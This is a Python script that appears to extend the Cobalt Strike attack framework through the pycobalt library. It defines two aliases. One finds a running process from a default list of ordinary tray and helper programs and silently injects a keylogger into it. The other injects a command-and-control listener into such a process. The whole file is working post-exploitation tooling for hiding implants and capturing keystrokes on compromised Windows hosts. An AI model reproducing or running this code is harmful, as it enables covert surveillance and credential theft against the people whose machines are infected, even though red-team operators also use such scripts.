#!/usr/bin/env python3

import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import os
import re
import textwrap
import datetime
import collections

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks
import pycobalt.helpers as helpers
from pycobalt.helpers import powershell_quote

default_procs = ['igfxEM.exe', 'vpnui.exe', 'acrotray.exe', 'igfxtray.exe']

@aliases.alias('autoinject-keylogger', 'Find a suitable process and inject keylogger')
def _(bid, *proc_names):
    if not proc_names:
        # defaults
        proc_names = default_procs

    def parsed_callback(procs):
        found = None
        for search in proc_names:
            for proc in procs:
                if search == proc['name'] and 'arch' in proc and 'user' in proc:
                    # inject it
                    aggressor.blog(bid, 'Keylogging process {} ({} {})'.format(proc['name'], proc['pid'], proc['arch']))
                    aggressor.bkeylogger(bid, proc['pid'], proc['arch'], silent=True)
                    return

        # nothing found
        aggressor.berror(bid, "Didn't find any processes to inject keylogger")

    def ps_callback(bid, content):
        procs = helpers.parse_ps(content)
        parsed_callback(procs)

    aggressor.btask(bid, 'Tasked beacon to keylog first accessible process named: ' + ', '.join(proc_names))
    aggressor.bps(bid, ps_callback)

@aliases.alias('autoinject-listener', 'Find a suitable process and inject listener')
def _(bid, listener=None, *proc_names):
    if not proc_names:
        # defaults
        proc_names = default_procs

    if not listener:
        # select default listener
        listener = helpers.default_listener()

    if listener not in aggressor.listeners():
        # listener not recognized
        aggressor.berror(bid, 'Unknown listener: {}'.format(listener))
        return

    def parsed_callback(procs):
        found = None
        for search in proc_names:
            for proc in procs:
                if search == proc['name'] and 'arch' in proc and 'user' in proc:
                    # inject it
                    aggressor.blog(bid, 'Injecting listener {} into process {} ({} {})'.format(listener, proc['name'], proc['pid'], proc['arch']))
                    aggressor.binject(bid, proc['pid'], listener, proc['arch'])
                    return

        # nothing found
        aggressor.berror(bid, "Didn't find any processes to inject listener {}".format(listener))

    def ps_callback(bid, content):
        procs = helpers.parse_ps(content)
        parsed_callback(procs)

    aggressor.btask(bid, 'Tasked beacon to inject listener {} into first accessible process named: {}'.format(listener, ', '.join(proc_names)))
    aggressor.bps(bid, ps_callback)

